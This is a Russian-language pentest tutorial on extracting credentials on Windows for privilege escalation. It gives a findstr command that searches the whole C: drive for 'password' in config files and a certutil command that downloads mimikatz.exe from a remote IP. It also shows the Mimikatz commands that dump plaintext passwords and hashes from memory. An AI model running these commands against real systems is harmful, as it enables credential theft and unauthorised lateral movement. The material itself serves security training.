#### Извлечение секретов и учетных данных

Яркими представителями этой категории являются следующие методы повышения привилегий:

    Взлом менеджеров паролей пользователей по причине небезопасной конфигурации
    Обнаружение секретов и учетных данных в логах и истории команд
    Извлечение учетных данных из оперативной памяти
    Доступ к файлу, хранящемуся хеши пользовательских паролей
    Извлечение учетных данных из конфигурации Групповых Политик

#### Поиск секретов и паролей в ОС

В первую очередь мы помним, что можно попытаться самостоятельно поискать пароли в различных файлах ОС при помощи команд
терминальной оболочки, например:

> cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config

Эта команда выполняет поиск строки "password" внутри всех файлов с расширениями .xml, .ini, .txt и .config в текущем
диске C:.

Более подробно, каждая часть команды выполняет следующие действия:

    cd C:\ — переходит в корневую папку диска C:
    findstr — команда для поиска строк в файлах
    /s — выполняет поиск строк во всех подпапках
    /p — пропускает файлы с непечатными символами
    /i — игнорирует регистр символов при поиске строк
    /n — выводит номер строки, содержащей строку
    /m — выводит только имя файла, если файл содержит совпадение

Таким образом, после выполнения команды будут выведены имена файлов, в которых найдена строка "password", а также номер
строки и сама строка с первым вхождением "password" в каждом файле.

Для повышения привилегий в ОС также существуют скрипты-энумераторы, которые отлично справляются с поиском и извлечением
паролей самостоятельно.

Для ОС Windows это скрипт WinPeas:

### Извлечение учетных данных из оперативной памяти

Самым ярким примером здесь будет извлечение учетных данных из оперативной памяти процессов.

Факт:

В Windows для реализации механизма HTTP Digest Authentication для поддержки SSO (Single Sign On) требуют знание
вводимого пароля, а не только его хеша. Поэтому разработчики Windows решили хранить пароли пользователей в открытом
виде. Для извлечения паролей и хешей из оперативной памяти можно использовать инструмент Mimikatz.

#### Mimikatz

Mimikatz — инструмент, реализующий функционал Windows Credentials Editor и позволяющий извлекать учетные данные
пользователей Windows.

Дополнительную информацию по данному инструменту можно получить по следующим ссылкам:

Что такое Mimikatz: руководство для начинающих — https://habr.com/ru/company/varonis/blog/539340/
Справка по mimikatz — https://kali.tools/?p=5342
Применение Mimikatz

Для загрузки инструмента mimikatz необходимо перейти в папку с правами на запись, например в C:
>\Windows\System32\spool\drivers\color.

Далее следует загрузить mimikatz на целевую машину. Это можно сделать утилитой, позволяющей скачивать файл по сети
>certutil: certutil -urlcache -split -f http://10.10.14.16/mimikatz.exe m.exe

После запуска Mimi нужно указать следующую команду, которая предоставит текущей учетной записи права отладки процессов (
SeDebugPrivilege): privilege::debug
Следующая команда вернет список всех хранящихся на этой машине хешей и паролей в виде незашифрованного текста:sekurlsa::
logonPasswords

Условия для Mimikatz

Для того, чтобы Mimikatz успешно извлёк пароли и хеши, необходимы права SeDebugPrivilege, которые, как правило, есть у
Администратора и нечасто встречаются у рядового пользователя. Тем не менее, процедура извлечения учётных данных из
памяти необходима в рамках проведения работ по пентесту для возможности как вертикального, так и горизонтального
перемещения.